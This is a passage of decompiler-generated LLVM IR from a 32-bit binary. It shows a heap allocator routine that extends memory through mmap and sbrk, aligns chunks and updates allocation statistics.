  br i1 %tmp129, label %dec_label_pc_805013c, label %dec_label_pc_80501cd

dec_label_pc_805013c:                             ; preds = %dec_label_pc_8050128
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050149 = call i32 @mmap(i32 0, i32 %v2_8050130, i32 3, i32 34, i32 0, i32 0, i32 %v1_8050100, i32 %v1_8050100)
  store i32 %v8_8050149, i32* %eax.global-to-local, align 4
  store i32 %v8_8050149, i32* @edx, align 4
  %v10_8050153 = icmp eq i32 %v8_8050149, -1
  br i1 %v10_8050153, label %dec_label_pc_805013c.dec_label_pc_80501cd_crit_edge, label %dec_label_pc_8050158

dec_label_pc_805013c.dec_label_pc_80501cd_crit_edge: ; preds = %dec_label_pc_805013c
  %v0_80501cd.pre = load i32, i32* @global_var_805fe4c.226, align 4
  br label %dec_label_pc_80501cd

dec_label_pc_8050158:                             ; preds = %dec_label_pc_805013c
  %v1_805015a = urem i32 %v8_8050149, 8
  %v2_805015a = icmp eq i32 %v1_805015a, 0
  store i32 %v1_805015a, i32* @ecx, align 4
  br i1 %v2_805015a, label %dec_label_pc_8050172, label %dec_label_pc_805015f

dec_label_pc_805015f:                             ; preds = %dec_label_pc_8050158
  %v0_8050164 = load i32, i32* @ebx, align 4
  %v2_8050166 = sub nsw i32 8, %v1_805015a
  store i32 %v2_8050166, i32* %eax.global-to-local, align 4
  %v2_8050168 = add i32 %v2_8050166, %v8_8050149
  store i32 %v2_8050168, i32* @edx, align 4
  %v2_805016a = sub i32 %v0_8050164, %v2_8050166
  store i32 %v2_805016a, i32* %esi.global-to-local, align 4
  %v2_805016c = inttoptr i32 %v2_8050168 to i32*
  store i32 %v2_8050166, i32* %v2_805016c, align 4
  br label %dec_label_pc_805017a

dec_label_pc_8050172:                             ; preds = %dec_label_pc_8050158
  %v1_8050172 = inttoptr i32 %v8_8050149 to i32*
  store i32 0, i32* %v1_8050172, align 4
  br label %dec_label_pc_805017a

dec_label_pc_805017a:                             ; preds = %dec_label_pc_805015f, %dec_label_pc_8050172
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_805015f ], [ @ebx, %dec_label_pc_8050172 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_805017a = or i32 %storemerge, 2
  %v1_805017d = load i32, i32* @edx, align 4
  %v2_805017d = add i32 %v1_805017d, 4
  %v3_805017d = inttoptr i32 %v2_805017d to i32*
  store i32 %v1_805017a, i32* %v3_805017d, align 4
  %v0_8050180 = load i32, i32* @global_var_8060170.233, align 16
  %v1_8050185 = add i32 %v0_8050180, 1
  store i32 %v1_8050185, i32* %eax.global-to-local, align 4
  store i32 %v1_8050185, i32* @global_var_8060170.233, align 16
  %v1_805018b = load i32, i32* @global_var_8060178.235, align 8
  %v7_8050191 = icmp sgt i32 %v1_8050185, %v1_805018b
  br i1 %v7_8050191, label %dec_label_pc_8050193, label %dec_label_pc_8050198

dec_label_pc_8050193:                             ; preds = %dec_label_pc_805017a
  store i32 %v1_8050185, i32* @global_var_8060178.235, align 8
  br label %dec_label_pc_8050198

dec_label_pc_8050198:                             ; preds = %dec_label_pc_805017a, %dec_label_pc_8050193
  %v0_8050198 = load i32, i32* @global_var_8060184.236, align 4
  %v1_805019d = load i32, i32* @ebx, align 4
  %v2_805019d = add i32 %v1_805019d, %v0_8050198
  store i32 %v2_805019d, i32* %eax.global-to-local, align 4
  store i32 %v2_805019d, i32* @global_var_8060184.236, align 4
  %v1_80501a4 = load i32, i32* @global_var_8060190.237, align 16
  %tmp130 = icmp ugt i32 %v2_805019d, %v1_80501a4
  br i1 %tmp130, label %dec_label_pc_80501ac, label %dec_label_pc_80501b1

dec_label_pc_80501ac:                             ; preds = %dec_label_pc_8050198
  store i32 %v2_805019d, i32* @global_var_8060190.237, align 16
  br label %dec_label_pc_80501b1

dec_label_pc_80501b1:                             ; preds = %dec_label_pc_8050198, %dec_label_pc_80501ac
  %v1_80501b1 = load i32, i32* @global_var_8060188.238, align 8
  %v2_80501b1 = add i32 %v1_80501b1, %v2_805019d
  store i32 %v2_80501b1, i32* %eax.global-to-local, align 4
  %v1_80501b7 = load i32, i32* @global_var_8060194.239, align 4
  %tmp131 = icmp ugt i32 %v2_80501b1, %v1_80501b7
  br i1 %tmp131, label %dec_label_pc_80501c3, label %dec_label_pc_804fe14

dec_label_pc_80501c3:                             ; preds = %dec_label_pc_80501b1
  store i32 %v2_80501b1, i32* @global_var_8060194.239, align 4
  br label %dec_label_pc_804fe14

dec_label_pc_80501cd:                             ; preds = %dec_label_pc_8050128, %dec_label_pc_805013c.dec_label_pc_80501cd_crit_edge, %dec_label_pc_8050117, %dec_label_pc_8050100
  %v0_80501cd = phi i32 [ %v0_80501cd.pre, %dec_label_pc_805013c.dec_label_pc_80501cd_crit_edge ], [ %v0_8050095, %dec_label_pc_8050117 ], [ %v0_8050095, %dec_label_pc_8050128 ], [ %v0_8050095, %dec_label_pc_8050100 ]
  store i32 %v0_80501cd, i32* %eax.global-to-local, align 4
  %v1_80501d6 = add i32 %v0_80501cd, 4
  %v2_80501d6 = inttoptr i32 %v1_80501d6 to i32*
  %v3_80501d6 = load i32, i32* %v2_80501d6, align 4
  %v1_80501e0 = and i32 %v3_80501d6, -4
  %v2_80501e0 = icmp eq i32 %v1_80501e0, 0
  store i32 %v1_80501e0, i32* @ebp, align 4
  %v1_80501e3 = load i32, i32* @global_var_8060168.240, align 8
  %v2_80501e3 = add i32 %v1_80501e3, %v1_805009f
  store i32 %v2_80501e3, i32* %eax.global-to-local, align 4
  %v0_80501e9 = load i8, i8* @global_var_8060180.241, align 128
  %v1_80501e9 = urem i8 %v0_80501e9, 2
  %v2_80501e9 = icmp eq i8 %v1_80501e9, 0
  br i1 %v2_80501e9, label %dec_label_pc_80501f4, label %dec_label_pc_80501f2

dec_label_pc_80501f2:                             ; preds = %dec_label_pc_80501cd
  %v2_80501f2 = sub i32 %v2_80501e3, %v1_80501e0
  store i32 %v2_80501f2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80501f4

dec_label_pc_80501f4:                             ; preds = %dec_label_pc_80501cd, %dec_label_pc_80501f2
  %v0_80501f8 = phi i32 [ %v2_80501e3, %dec_label_pc_80501cd ], [ %v2_80501f2, %dec_label_pc_80501f2 ]
  %v5_80501f8 = add i32 %v0_80501f8, %v1_8050100
  store i32 %v5_80501f8, i32* %eax.global-to-local, align 4
  %v1_80501fc = sub i32 0, %v0_80500cc
  store i32 %v1_80501fc, i32* @edx, align 4
  %v2_8050204 = and i32 %v5_80501f8, %v1_80501fc
  store i32 %v2_8050204, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_8050204, 1
  br i1 %tmp88, label %dec_label_pc_805021e, label %dec_label_pc_8050208

dec_label_pc_8050208:                             ; preds = %dec_label_pc_80501f4
  store i32 %v2_8050204, i32* %stack_var_-92, align 4
  %v1_805020c = call i32 @__GI_sbrk(i32 %v2_8050204)
  store i32 %v1_805020c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_805020c, i32* @ebx, align 4
  %v10_8050219 = icmp eq i32 %v1_805020c, -1
  %v1_805021c = icmp eq i1 %v10_8050219, false
  br i1 %v1_805021c, label %dec_label_pc_8050274.dec_label_pc_805027d_crit_edge, label %dec_label_pc_8050208.dec_label_pc_805021e_crit_edge

dec_label_pc_8050208.dec_label_pc_805021e_crit_edge: ; preds = %dec_label_pc_8050208
  %v0_805021e.pre = load i8, i8* @global_var_8060180.241, align 128
  br label %dec_label_pc_805021e

dec_label_pc_805021e:                             ; preds = %dec_label_pc_8050208.dec_label_pc_805021e_crit_edge, %dec_label_pc_80501f4
  %v0_805024a = phi i32 [ -1, %dec_label_pc_8050208.dec_label_pc_805021e_crit_edge ], [ %v1_80501fc, %dec_label_pc_80501f4 ]
  %v0_805021e = phi i8 [ %v0_805021e.pre, %dec_label_pc_8050208.dec_label_pc_805021e_crit_edge ], [ %v0_80501e9, %dec_label_pc_80501f4 ]
  %v1_805021e = urem i8 %v0_805021e, 2
  %v2_805021e = icmp eq i8 %v1_805021e, 0
  br i1 %v2_805021e, label %dec_label_pc_805021e.dec_label_pc_8050233_crit_edge, label %dec_label_pc_8050227

dec_label_pc_805021e.dec_label_pc_8050233_crit_edge: ; preds = %dec_label_pc_805021e
  %v0_8050233.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050233

dec_label_pc_8050227:                             ; preds = %dec_label_pc_805021e
  %v2_805022b = add i32 %v1_80501e0, %v1_8050100
  store i32 %v2_805022b, i32* %eax.global-to-local, align 4
  %v0_805022d = load i32, i32* @esi, align 4
  %v2_805022d = add i32 %v0_805022d, %v2_805022b
  %v5_805022f = and i32 %v2_805022d, %v1_80501fc
  store i32 %v5_805022f, i32* @esi, align 4
  br label %dec_label_pc_8050233

dec_label_pc_8050233:                             ; preds = %dec_label_pc_805021e.dec_label_pc_8050233_crit_edge, %dec_label_pc_8050227
  %v0_8050233 = phi i32 [ %v0_8050233.pre, %dec_label_pc_805021e.dec_label_pc_8050233_crit_edge ], [ %v5_805022f, %dec_label_pc_8050227 ]
  %tmp132 = icmp ult i32 %v0_8050233, 1048576
  br i1 %tmp132, label %dec_label_pc_805023b, label %dec_label_pc_8050240

dec_label_pc_805023b:                             ; preds = %dec_label_pc_8050233
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8050240

dec_label_pc_8050240:                             ; preds = %dec_label_pc_8050233, %dec_label_pc_805023b
  %v0_8050254 = phi i32 [ %v0_8050233, %dec_label_pc_8050233 ], [ 1048576, %dec_label_pc_805023b ]
  %tmp133 = icmp ugt i32 %v0_8050254, %v1_805012a
  br i1 %tmp133, label %dec_label_pc_805024a, label %dec_label_pc_8050482

dec_label_pc_805024a:                             ; preds = %dec_label_pc_8050240
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050257 = call i32 @mmap(i32 0, i32 %v0_8050254, i32 3, i32 34, i32 0, i32 0, i32 %v0_805024a, i32 %v0_805024a)
  store i32 %v8_8050257, i32* %eax.global-to-local, align 4
  store i32 %v8_8050257, i32* @ebx, align 4
  %v10_8050261 = icmp eq i32 %v8_8050257, -1
  br i1 %v10_8050261, label %dec_label_pc_8050482, label %dec_label_pc_8050274.thread

dec_label_pc_8050274.thread:                      ; preds = %dec_label_pc_805024a
  %v0_805026a = load i8, i8* @global_var_8060180.241, align 1
  %v2_805026a = and i8 %v0_805026a, -2
  store i8 %v2_805026a, i8* @global_var_8060180.241, align 128
  %v1_8050271 = load i32, i32* @esi, align 4
  %v2_8050271 = add i32 %v1_8050271, %v8_8050257
  store i32 %v2_8050271, i32* @edx, align 4
  br label %dec_label_pc_805027d

dec_label_pc_8050274.dec_label_pc_805027d_crit_edge: ; preds = %dec_label_pc_8050208
  %v1_8050281.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805027d

dec_label_pc_805027d:                             ; preds = %dec_label_pc_8050274.dec_label_pc_805027d_crit_edge, %dec_label_pc_8050274.thread
  %v1_8050281 = phi i32 [ %v1_8050271, %dec_label_pc_8050274.thread ], [ %v1_8050281.pre, %dec_label_pc_8050274.dec_label_pc_805027d_crit_edge ]
  %v0_805034992 = phi i32 [ %v8_8050257, %dec_label_pc_8050274.thread ], [ %v1_805020c, %dec_label_pc_8050274.dec_label_pc_805027d_crit_edge ]
  %v0_805033b91 = phi i32 [ %v2_8050271, %dec_label_pc_8050274.thread ], [ -1, %dec_label_pc_8050274.dec_label_pc_805027d_crit_edge ]
  %v0_8050281 = load i32, i32* @global_var_8060188.238, align 8
  %v2_8050281 = add i32 %v1_8050281, %v0_8050281
  store i32 %v2_8050281, i32* @global_var_8060188.238, align 8
  %v2_8050287 = add i32 %v1_80501e0, %v0_80501cd
  store i32 %v2_8050287, i32* %ecx.global-to-local, align 4
  %v2_8050289 = sub i32 %v0_805034992, %v2_8050287
  %v7_8050289 = icmp ult i32 %v0_805034992, %v2_8050287
  %v12_8050289 = icmp eq i32 %v2_8050289, 0
  %v1_805028b = icmp eq i1 %v12_8050289, false
  br i1 %v1_805028b, label %dec_label_pc_80502a4, label %dec_label_pc_805028d

dec_label_pc_805028d:                             ; preds = %dec_label_pc_805027d
  %v10_805028d = icmp eq i32 %v0_805033b91, -1
  %v1_8050290 = icmp eq i1 %v10_805028d, false
  br i1 %v1_8050290, label %dec_label_pc_80502a4, label %dec_label_pc_8050292

dec_label_pc_8050292:                             ; preds = %dec_label_pc_805028d
  %v2_8050292 = add i32 %v1_8050281, %v1_80501e0
  store i32 %v0_80501cd, i32* %ecx.global-to-local, align 4
  %v1_8050299 = or i32 %v2_8050292, 1
  store i32 %v1_8050299, i32* %eax.global-to-local, align 4
  store i32 %v1_8050299, i32* %v2_80501d6, align 4
  br label %dec_label_pc_80503d1

dec_label_pc_80502a4:                             ; preds = %dec_label_pc_805028d, %dec_label_pc_805027d
  %v0_80502a4 = load i8, i8* @global_var_8060180.241, align 1
  %v1_80502a4 = sext i8 %v0_80502a4 to i32
  store i32 %v1_80502a4, i32* %eax.global-to-local, align 4
  %v2_80502a9 = urem i8 %v0_80502a4, 2
  %v3_80502a9 = icmp eq i8 %v2_80502a9, 0
  br i1 %v3_80502a9, label %dec_label_pc_80502bd, label %dec_label_pc_80502ad

dec_label_pc_80502ad:                             ; preds = %dec_label_pc_80502a4
  br i1 %v2_80501e0, label %dec_label_pc_80502bd, label %dec_label_pc_80502b1

dec_label_pc_80502b1:                             ; preds = %dec_label_pc_80502ad
  %v1_80502b3 = icmp eq i1 %v7_8050289, false
  br i1 %v1_80502b3, label %dec_label_pc_80502bd, label %dec_label_pc_80502b5

dec_label_pc_80502b5:                             ; preds = %dec_label_pc_80502b1
  %v1_80502b5 = and i32 %v1_80502a4, -2
  %v4_80502b5 = trunc i32 %v1_80502b5 to i8
  store i32 %v1_80502b5, i32* %eax.global-to-local, align 4
  store i8 %v4_80502b5, i8* @global_var_8060180.241, align 128
  br label %dec_label_pc_80502bd

dec_label_pc_80502bd:                             ; preds = %dec_label_pc_80502b1, %dec_label_pc_80502ad, %dec_label_pc_80502a4, %dec_label_pc_80502b5
  %v0_80502bd = phi i8 [ %v0_80502a4, %dec_label_pc_80502b1 ], [ %v0_80502a4, %dec_label_pc_80502ad ], [ %v0_80502a4, %dec_label_pc_80502a4 ], [ %v4_80502b5, %dec_label_pc_80502b5 ]
  %v1_80502bd = urem i8 %v0_80502bd, 2
  %v2_80502bd = icmp eq i8 %v1_80502bd, 0
  br i1 %v2_80502bd, label %dec_label_pc_805033b, label %dec_label_pc_80502c6

dec_label_pc_80502c6:                             ; preds = %dec_label_pc_80502bd
  br i1 %v2_80501e0, label %dec_label_pc_80502d4, label %dec_label_pc_80502ca

dec_label_pc_80502ca:                             ; preds = %dec_label_pc_80502c6
  store i32 %v2_8050289, i32* %eax.global-to-local, align 4
  %v2_80502ce = add i32 %v2_8050281, %v2_8050289
  store i32 %v2_80502ce, i32* @global_var_8060188.238, align 8
  br label %dec_label_pc_80502d4

dec_label_pc_80502d4:                             ; preds = %dec_label_pc_80502c6, %dec_label_pc_80502ca
  %v1_80502d6 = urem i32 %v0_805034992, 8
  %v2_80502d6 = icmp eq i32 %v1_80502d6, 0
  store i32 %v1_80502d6, i32* %edx.global-to-local, align 4
  %v1_80502d9 = icmp eq i1 %v2_80502d6, false
  br i1 %v1_80502d9, label %dec_label_pc_80502e1, label %dec_label_pc_80502db

dec_label_pc_80502db:                             ; preds = %dec_label_pc_80502d4
  store i32 %v0_805034992, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80502eb

dec_label_pc_80502e1:                             ; preds = %dec_label_pc_80502d4
  %v2_80502e6 = sub nsw i32 8, %v1_80502d6
  store i32 %v2_80502e6, i32* %eax.global-to-local, align 4
  %v2_80502e8 = add i32 %v2_80502e6, %v0_805034992
  store i32 %v2_80502e8, i32* @edi, align 4
  br label %dec_label_pc_80502eb

dec_label_pc_80502eb:                             ; preds = %dec_label_pc_80502db, %dec_label_pc_80502e1
  %v0_80502ee = phi i32 [ 0, %dec_label_pc_80502db ], [ %v2_80502e6, %dec_label_pc_80502e1 ]
  %v2_80502eb = add i32 %v1_8050281, %v0_805034992
  %v2_80502ee = add i32 %v0_80502ee, %v1_80501e0
  store i32 %v2_80502ee, i32* %ecx.global-to-local, align 4
  %v2_80502f7 = add i32 %v2_80502ee, %v2_80502eb
  store i32 %v2_80502f7, i32* %edx.global-to-local, align 4
  %v2_80502fd = add i32 %v2_80502f7, %v1_8050100
  %v5_8050300 = and i32 %v2_80502fd, %v1_80501fc
  %v2_8050307 = sub i32 %v5_8050300, %v2_80502f7
  store i32 %v2_8050307, i32* %eax.global-to-local, align 4
  %v2_8050309 = add i32 %v2_8050307, %v2_80502ee
  store i32 %v2_8050309, i32* @esi, align 4
  store i32 %v2_8050309, i32* %stack_var_-92, align 4
  %v1_805030d = call i32 @__GI_sbrk(i32 %v2_8050309)
  store i32 %v1_805030d, i32* %eax.global-to-local, align 4
  store i32 %v1_805030d, i32* @edx, align 4
  %v10_8050317 = icmp eq i32 %v1_805030d, -1
  %v1_805031a = icmp eq i1 %v10_8050317, false
  br i1 %v1_805031a, label %dec_label_pc_805032a, label %dec_label_pc_805031c

dec_label_pc_805031c:                             ; preds = %dec_label_pc_80502eb
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050321 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050321, i32* %eax.global-to-local, align 4
  store i32 %v1_8050321, i32* @edx, align 4
  br label %dec_label_pc_805035e

dec_label_pc_805032a:                             ; preds = %dec_label_pc_80502eb
  %v1_805032a = load i32, i32* @ebx, align 4
  %v7_805032a = icmp ult i32 %v1_805030d, %v1_805032a
  %v1_805032c = icmp eq i1 %v7_805032a, false
  br i1 %v1_805032c, label %dec_label_pc_8050363, label %dec_label_pc_805032e

dec_label_pc_805032e:                             ; preds = %dec_label_pc_805032a
  %v0_805032e = load i8, i8* @global_var_8060180.241, align 1
  %v2_805032e = and i8 %v0_805032e, -2
  store i8 %v2_805032e, i8* @global_var_8060180.241, align 128
  store i32 %v2_80502eb, i32* @edx, align 4
  br label %dec_label_pc_8050342

dec_label_pc_805033b:                             ; preds = %dec_label_pc_80502bd
  %v10_805033b = icmp eq i32 %v0_805033b91, -1
  br i1 %v10_805033b, label %dec_label_pc_8050346, label %dec_label_pc_8050340

dec_label_pc_8050340:                             ; preds = %dec_label_pc_805033b
  store i32 %v0_805034992, i32* @edi, align 4
  br label %dec_label_pc_8050342

dec_label_pc_8050342:                             ; preds = %dec_label_pc_805032e, %dec_label_pc_8050340
  %v0_805036349 = phi i32 [ %v2_80502eb, %dec_label_pc_805032e ], [ %v0_805033b91, %dec_label_pc_8050340 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050363

dec_label_pc_8050346:                             ; preds = %dec_label_pc_805033b
  store i32 %v0_805034992, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805034d = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805034d, i32* @edx, align 4
  %v1_8050354 = load i32, i32* @ebx, align 4
  %v2_8050354 = sub i32 %v1_805034d, %v1_8050354
  %v1_8050356 = load i32, i32* @esi, align 4
  %v2_8050356 = sub i32 %v2_8050354, %v1_8050356
  store i32 %v2_8050356, i32* %eax.global-to-local, align 4
  %v0_8050358 = load i32, i32* @global_var_8060188.238, align 8
  %v2_8050358 = add i32 %v0_8050358, %v2_8050356
  store i32 %v2_8050358, i32* @global_var_8060188.238, align 8
  br label %dec_label_pc_805035e

dec_label_pc_805035e:                             ; preds = %dec_label_pc_805031c, %dec_label_pc_8050346
  %v0_805036348 = phi i32 [ %v1_8050321, %dec_label_pc_805031c ], [ %v1_805034d, %dec_label_pc_8050346 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050363

dec_label_pc_8050363:                             ; preds = %dec_label_pc_805032a, %dec_label_pc_8050342, %dec_label_pc_805035e
  %v0_8050368 = phi i32 [ %v1_805030d, %dec_label_pc_805032a ], [ %v0_805036349, %dec_label_pc_8050342 ], [ %v0_805036348, %dec_label_pc_805035e ]
  %v10_8050363 = icmp eq i32 %v0_8050368, -1
  br i1 %v10_8050363, label %dec_label_pc_80503d1, label %dec_label_pc_8050368

dec_label_pc_8050368:                             ; preds = %dec_label_pc_8050363
  %v1_8050368 = load i32, i32* @edi, align 4
  %v2_8050368 = sub i32 %v0_8050368, %v1_8050368
  store i32 %v2_8050368, i32* @edx, align 4
  store i32 %v1_8050368, i32* @global_var_805fe4c.226, align 4
  %v1_8050370 = load i32, i32* @esi, align 4
  %v2_8050370 = add i32 %v1_8050370, %v2_8050368
  %v1_8050373 = or i32 %v2_8050370, 1
  store i32 %v1_8050373, i32* %eax.global-to-local, align 4
  %v2_8050376 = add i32 %v1_8050368, 4
  %v3_8050376 = inttoptr i32 %v2_8050376 to i32*
  store i32 %v1_8050373, i32* %v3_8050376, align 4
  %v0_8050379 = load i32, i32* @global_var_8060188.238, align 8
  %v1_8050379 = load i32, i32* @esi, align 4
  %v2_8050379 = add i32 %v1_8050379, %v0_8050379
  store i32 %v2_8050379, i32* @global_var_8060188.238, align 8
  br i1 %v2_80501e0, label %dec_label_pc_80503d1, label %dec_label_pc_8050383

dec_label_pc_8050383:                             ; preds = %dec_label_pc_8050368
  %v1_8050383 = add i32 %v1_80501e0, -12
  store i32 %v0_80501cd, i32* %ecx.global-to-local, align 4
  %v1_805038a = and i32 %v1_8050383, -8
  store i32 %v1_805038a, i32* %eax.global-to-local, align 4
  %v1_805038f = or i32 %v1_805038a, 1
  store i32 %v1_805038f, i32* @edx, align 4
  %v5_8050392 = icmp ult i32 %v1_805038a, 15
  store i32 %v1_805038f, i32* %v2_80501d6, align 4
  %v0_8050398 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050398 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050398 = add i32 %v0_8050398, 4
  %v3_8050398 = add i32 %v2_8050398, %v1_8050398
  %v4_8050398 = inttoptr i32 %v3_8050398 to i32*
  store i32 5, i32* %v4_8050398, align 4
  %v0_80503a0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80503a0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80503a0 = add i32 %v0_80503a0, 8
  %v3_80503a0 = add i32 %v2_80503a0, %v1_80503a0
  %v4_80503a0 = inttoptr i32 %v3_80503a0 to i32*
  store i32 5, i32* %v4_80503a0, align 4
  br i1 %v5_8050392, label %dec_label_pc_80503d1, label %dec_label_pc_80503aa

dec_label_pc_80503aa:                             ; preds = %dec_label_pc_8050383
  %v0_80503ad = load i32, i32* %ecx.global-to-local, align 4
  %v1_80503af = add i32 %v0_80503ad, 8
  store i32 %v1_80503af, i32* %eax.global-to-local, align 4
  %v0_80503b2 = load i32, i32* @global_var_8060164.242, align 4
  store i32 %v0_80503b2, i32* @ebx, align 4
  store i32 %v1_80503af, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8060164.242, align 4
  %v1_80503c3 = call i32 @free(i32 %v1_80503af)
  store i32 %v1_80503c3, i32* %eax.global-to-local, align 4
  %v0_80503c8 = load i32, i32* @ebx, align 4
  store i32 %v0_80503c8, i32* @global_var_8060164.242, align 4
  br label %dec_label_pc_80503d1

dec_label_pc_80503d1:                             ; preds = %dec_label_pc_8050383, %dec_label_pc_8050368, %dec_label_pc_8050363, %dec_label_pc_8050292, %dec_label_pc_80503aa
  %v0_80503d1 = load i32, i32* @global_var_8060188.238, align 8
  store i32 %v0_80503d1, i32* %eax.global-to-local, align 4
  %v1_80503d6 = load i32, i32* @global_var_806018c.243, align 4
  %tmp134 = icmp ugt i32 %v0_80503d1, %v1_80503d6
  br i1 %tmp134, label %dec_label_pc_80503de, label %dec_label_pc_80503e3

dec_label_pc_80503de:                             ; preds = %dec_label_pc_80503d1
  store i32 %v0_80503d1, i32* @global_var_806018c.243, align 4
  br label %dec_label_pc_80503e3

dec_label_pc_80503e3:                             ; preds = %dec_label_pc_80503d1, %dec_label_pc_80503de
  %v1_80503e3 = load i32, i32* @global_var_8060184.236, align 4
  %v2_80503e3 = add i32 %v1_80503e3, %v0_80503d1
  store i32 %v2_80503e3, i32* %eax.global-to-local, align 4
  %v1_80503e9 = load i32, i32* @global_var_8060194.239, align 4
  %tmp135 = icmp ugt i32 %v2_80503e3, %v1_80503e9
  br i1 %tmp135, label %dec_label_pc_80503f1, label %dec_label_pc_80503f6

dec_label_pc_80503f1:                             ; preds = %dec_label_pc_80503e3
  store i32 %v2_80503e3, i32* @global_var_8060194.239, align 4
  br label %dec_label_pc_80503f6

dec_label_pc_80503f6:                             ; preds = %dec_label_pc_80503e3, %dec_label_pc_80503f1
  %v0_80503f6 = load i32, i32* @global_var_805fe4c.226, align 4
  store i32 %v0_80503f6, i32* @ebx, align 4
  %v1_80503fc = add i32 %v0_80503f6, 4
  %v2_80503fc = inttoptr i32 %v1_80503fc to i32*
  %v3_80503fc = load i32, i32* %v2_80503fc, align 4
  %v1_80503ff = and i32 %v3_80503fc, -4
  store i32 %v1_80503ff, i32* @ecx, align 4
  %v10_8050402 = icmp ult i32 %v1_80503ff, %v1_805009f
  br i1 %v10_8050402, label %dec_label_pc_8050482, label %dec_label_pc_8050408

dec_label_pc_8050408:                             ; preds = %dec_label_pc_80503f6
  store i32 %v1_805012a, i32* %esi.global-to-local, align 4
  %v2_805040e = sub i32 %v1_80503ff, %v1_805012a
  store i32 %v2_805040e, i32* %ecx.global-to-local, align 4
  %v2_8050410 = add i32 %v0_80503f6, %v1_805012a
  store i32 %v2_8050410, i32* @edx, align 4
  %v1_8050413 = or i32 %v1_805012a, 1
  store i32 %v1_8050413, i32* %eax.global-to-local, align 4
  store i32 %v2_8050410, i32* @global_var_805fe4c.226, align 4
  store i32 %v1_8050413, i32* %v2_80503fc, align 4
  %v0_805041f.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805041f

dec_label_pc_805041f:                             ; preds = %dec_label_pc_80500b0, %dec_label_pc_8050408
  %v0_805041f = phi i32 [ %v5_80500c3, %dec_label_pc_80500b0 ], [ %v0_805041f.pre, %dec_label_pc_8050408 ]
  %v1_805041f = or i32 %v0_805041f, 1
  store i32 %v1_805041f, i32* @ecx, align 4
  %v0_8050422 = load i32, i32* @ebx, align 4
  %v1_8050422 = add i32 %v0_8050422, 8
  store i32 %v1_8050422, i32* %ebx.global-to-local, align 4
  %v1_8050425 = load i32, i32* @edx, align 4
  %v2_8050425 = add i32 %v1_8050425, 4
  %v3_8050425 = inttoptr i32 %v2_8050425 to i32*
  store i32 %v1_805041f, i32* %v3_8050425, align 4
  br label %dec_label_pc_805048f

dec_label_pc_805042a:                             ; preds = %dec_label_pc_804fe6a
  %v5_8050430 = sub i32 %v1_804fe4d, %v1_805012a
  store i32 %v5_8050430, i32* %eax.global-to-local, align 4
  %v2_8050434 = add i32 %v0_804ff18111, %v1_805012a
  store i32 %v2_8050434, i32* @edx, align 4
  %v1_8050438 = or i32 %v1_805012a, 1
  store i32 %v2_8050434, i32* @global_var_805fe50.227, align 16
  store i32 %v1_8050438, i32* %v2_804fe47, align 4
  %v0_8050444 = load i32, i32* %eax.global-to-local, align 4
  %v0_8050446 = load i32, i32* @edx, align 4
  store i32 %v0_8050446, i32* @global_var_805fe5c.244, align 4
  %v1_805044c = or i32 %v0_8050444, 1
  store i32 %v1_805044c, i32* @ecx, align 4
  store i32 %v0_8050446, i32* @global_var_805fe60.229, align 32
  %v1_8050455 = add i32 %v0_8050446, 8
  %v2_8050455 = inttoptr i32 %v1_8050455 to i32*
  store i32 ptrtoint (i32* @global_var_805fe54.228 to i32), i32* %v2_8050455, align 4
  %v0_805045c = load i32, i32* @edx, align 4
  %v1_805045c = add i32 %v0_805045c, 12
  %v2_805045c = inttoptr i32 %v1_805045c to i32*
  store i32 ptrtoint (i32* @global_var_805fe54.228 to i32), i32* %v2_805045c, align 4
  %v0_8050463 = load i32, i32* @ecx, align 4
  %v1_8050463 = load i32, i32* @edx, align 4
  %v2_8050463 = add i32 %v1_8050463, 4
  %v3_8050463 = inttoptr i32 %v2_8050463 to i32*
  store i32 %v0_8050463, i32* %v3_8050463, align 4
  %v0_8050466 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050466 = load i32, i32* @edx, align 4
  %v3_8050466 = add i32 %v1_8050466, %v0_8050466
  %v4_8050466 = inttoptr i32 %v3_8050466 to i32*
  store i32 %v0_8050466, i32* %v4_8050466, align 4
  br label %dec_label_pc_8050474

dec_label_pc_805046b:                             ; preds = %dec_label_pc_804fe79
  store i32 %v1_805012a, i32* %ebx.global-to-local, align 4
  %v0_805046f = load i32, i32* @ebp, align 4
  %v2_805046f = or i32 %v1_805012a, 4
  %v3_805046f = add i32 %v0_805046f, %v2_805046f
  %v4_805046f = inttoptr i32 %v3_805046f to i32*
  %v5_805046f = load i32, i32* %v4_805046f, align 4
  %v6_805046f = or i32 %v5_805046f, 1
  store i32 %v6_805046f, i32* %v4_805046f, align 4
  br label %dec_label_pc_8050474

dec_label_pc_8050474:                             ; preds = %dec_label_pc_805042a, %dec_label_pc_805046b
  %v0_8050474 = load i32, i32* @ebp, align 4
  %v1_8050474 = add i32 %v0_8050474, 8
  store i32 %v1_8050474, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805048f

dec_label_pc_8050479:                             ; preds = %dec_label_pc_804ff69
  %v1_8050479 = load i32, i32* @ebx, align 4
  %v2_8050479 = add i32 %v0_804ff78, 4
  %v3_8050479 = add i32 %v2_8050479, %v1_8050479
  %v4_8050479 = inttoptr i32 %v3_8050479 to i32*
  %v5_8050479 = load i32, i32* %v4_8050479, align 4
